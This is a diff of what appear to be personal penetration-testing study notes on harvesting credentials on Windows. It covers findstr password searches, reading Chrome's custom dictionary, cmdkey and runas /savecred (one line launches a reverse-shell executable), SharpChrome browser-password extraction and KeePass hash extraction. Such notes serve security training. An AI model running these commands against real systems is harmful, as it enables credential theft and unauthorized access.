@@ -1,29 +1,37 @@
-There are many ways to steal credentials on a Windows system. Below are common techniques with simple explanations and the commands you can use.
 
-### 1. Cmdkey Saved Credentials
+# Search Application Config Files for Passwords
+Many applications store passwords in config files in plain text (bad practice)
+```powershell
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+```
+
+# Check Chrome Custom Dictionary for Passwords
+Users might save passwords or secrets as custom dictionary entries.
+```powershell
+Get-Content "C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt" | Select-String "password"
+```
+- Replace `<username>` with the actual Windows user.
+- This reads the dictionary file and searches for the word "password".
+
+# Cmdkey Saved Credentials
 Windows stores saved usernames and passwords for things like Remote Desktop connections.
 
-List saved credentials:
-
 ```bash
+# List saved credentials:
 cmdkey /list
-```
 
-Run a command as a saved user:
-
-```bash
+# If found any cres then:
+# Run a shell here
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+# Run a command as a saved user:
 runas /savecred /user:inlanefreight\bob "COMMAND HERE"
-```
-
-Example: Run PowerShell as that user:
-
-```bash
+# Example: Run PowerShell as that user:
 runas /savecred /user:inlanefreight\bob "powershell.exe"
 ```
 
-When connecting via RDP, the saved credentials are used automatically.
+![[Pasted image 20250828064001.png]]
 
-### 2. Browser Credentials (Chrome)
+# Browser Credentials (Chrome)
 Users often save passwords in their browsers.
 
 Extract saved Chrome passwords with SharpChrome:
@@ -34,7 +42,7 @@ Extract saved Chrome passwords with SharpChrome:
 
 This displays usernames and passwords saved in Chrome for the current user.
 
-### 3. Password Managers (KeePass)
+# Password Managers (KeePass)
 Password managers like KeePass store multiple passwords securely but can sometimes be cracked.
 
 Extract KeePass hash from .kdbx file:
